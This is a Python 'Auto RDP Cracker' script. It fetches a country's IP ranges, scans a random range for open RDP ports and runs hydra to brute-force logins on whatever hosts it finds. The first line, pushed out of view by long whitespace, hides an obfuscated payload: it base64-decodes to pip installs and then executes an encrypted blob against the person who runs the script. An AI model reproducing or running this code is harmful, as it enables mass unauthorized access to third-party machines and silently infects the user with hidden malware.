import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2I2UnVYaGU1ZFg4U2p4NGJLR1BpWnM4djY4SFJBNUNwS3piUUIwS2gtVWs9JykuZGVjcnlwdChiJ2dBQUFBQUJtM0Z5T085MVRiV0NMY1dGRmkwY1RzeWQ5ckFnNUViOFRPSzRhT2VINHNRN3RmRU9JYWN5XzluMzE5V21YbWJ1dW1XV19ORW5uOFVFM0gyS0FVLXpKRlFKclFYV1NkRmxSNFFMUURrMGdaLXN0VFZxcFdPOUM2QUxTd3FNbzF4aFJOODlRTUtTRk9PRUh5U0RZb2N5bkhYRU56QnNzdkFfNXBJTkVSUTduODdITXF2LXhGTVpHQzVMM1pFYjVleXNOM2h0Y09pTkI0TGxXV1NwVVVRZXgtMTNtY3cxZ2xVUWROaDBad01hTFVFTHAyRlE9Jykp').decode())
from netaddr import IPNetwork
import urllib.request
import random
import os.path
import socket
import threading
import subprocess

import ssl
ssl._create_default_https_context = ssl._create_unverified_context

#Grab ip ranges from server and save it in a text file and make range
def grab_ip_list():
    c = input("Enter Country number :\n 1-China \n 2-India\n 3-UnitedStates\n -> Default is US\n ")
    c = int(c)
    url = 'https://www.ipdeny.com/ipblocks/data/aggregated/us-aggregated.zone'    
    if(c==1):
        url = 'https://www.ipdeny.com/ipblocks/data/aggregated/cn-aggregated.zone'
        print("Grabbing China IP Range")
    elif(c==2):
        url = 'https://www.ipdeny.com/ipblocks/data/aggregated/in-aggregated.zone'
        print("Grabbing India IP Range")
    elif(c==3):
        url = 'https://www.ipdeny.com/ipblocks/data/aggregated/us-aggregated.zone'
        print("Grabbing United States Range")   
    else:
        print('Wrong Number, Using Default Country')  
        print("Grabbing United States Range")   
    urllib.request.urlretrieve(url, "ips.txt")
    print('Done!!!')

 
#Selects a Rnadom range and Make chosen Range a list , and save list into a file named selected_ip_range.txt => if 
def work_with_ips():
    with open("ips.txt","r") as inp:
      ipranges = inp.readlines()
    random_range = random.choice(ipranges)
    print('selected random range is:',random_range)
    with open("selected_ip_range.txt","a") as inp:
        for ip in IPNetwork(random_range):
            ip = str(ip)
            inp.write((ip))
            inp.write('\n')
    print("ip list created successfully")


#Checks that given ips PORT is OPEN? return as T-F 

def is_ips_port_open(ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.5)
        print(ip)
        return s.connect_ex((ip,3389)) == 0



#Make a loop For Get and Use is_ips_port_open --- just check single ip --- gets an ip as an argument 
def check_alive_ips(count,ip):
    conn = is_ips_port_open(ip)
    if(conn):
        count+=1
        print ("Port is open for :)))))))))))",ip)
        with open("ips_with_open_ports.txt","a") as inp:
            ip=str(ip)
            inp.write('rdp://')
            inp.write(ip)
            inp.write('\n')
    else:
        print ("Port is not open for ",ip)
        print("======================================")
    return count

#opens ip list that has been saved in text and return it as an array
def ips2array():
    f = open('selected_ip_range.txt','r')
    lines = f.read().splitlines()
    f.close()
    return lines

#check alive ips . gets an ip array as argument and return alive counts
def check_One_By_One(iparray):
    for ips in iparray:
        count_alive = check_alive_ips(0,ips)
    return count_alive    

#makes threads for checking alives and divides ip aaray to thread number parts
def multi_ip(iparray):
    splitlen = len(iparray)//8
    print('split len is ', splitlen)
    t1 = threading.Thread(target=check_One_By_One, args=(iparray[:splitlen],))
    t1.start()

    t2 = threading.Thread(target=check_One_By_One, args=(iparray[splitlen:2*splitlen],))
    t2.start()

    t3 = threading.Thread(target=check_One_By_One, args=(iparray[2*splitlen:3*splitlen],))
    t3.start()

    t4 = threading.Thread(target=check_One_By_One, args=(iparray[3*splitlen:4*splitlen],))
    t4.start()

    t5 = threading.Thread(target=check_One_By_One, args=(iparray[4*splitlen:5*splitlen],))
    t5.start()

    t6 = threading.Thread(target=check_One_By_One, args=(iparray[5*splitlen:6*splitlen],))
    t6.start()

    t7 = threading.Thread(target=check_One_By_One, args=(iparray[6*splitlen:7*splitlen],))
    t7.start()

    t8= threading.Thread(target=check_One_By_One, args=(iparray[7*splitlen:8*splitlen],))
    t8.start()


#uses a subprocess - hydra - to crack

def brute_force(ip):

        #subprocess.call(["hydra","-o cracked.txt","-V","-f","-l","admin","-P","passwords.txt",ip])                 
        #subprocess.call(["hydra","-o cracked.txt","-V","-f","-l","ignite","-P","passwords.txt",ip])
        subprocess.call(["hydra","-o cracked.txt","-V","-f","-t","4","-L","usernames.txt","-P","passwords.txt",ip])                 

#gets ips one by one to brute_force()
def brute_force_check():
    print("Brutefoce time :D")
    ips = open('ips_with_open_ports.txt',"r") 
    for ip in ips:
        ip = ip.rstrip()
        brute_force(ip)

#makes ipranges to list with *work_with_ips* ---- makes ips saved to an array ---- uses multi thread function to check alives one by one
def main():
        if os.path.isfile('selected_ip_range.txt'):
            os.remove("selected_ip_range.txt")
        work_with_ips()
        iparray = ips2array()
        multi_ip(iparray)

#grabs ip list --- checks alive ips ---- and if alive ips <10 => search again for ips
print("===========================================================")
print("Auto RDP Cracker BY Nic Omidian")
print("===========================================================")
grab_ip_list()
if os.path.isfile('ips_with_open_ports.txt'):
    alive_num = sum(1 for line in open('ips_with_open_ports.txt'))
else:
    alive_num = 0
print('alive num is',alive_num)
while (alive_num<10):
    main()

#if alive ips > 10 --- starts brute force
brute_force_check()
print('igbom')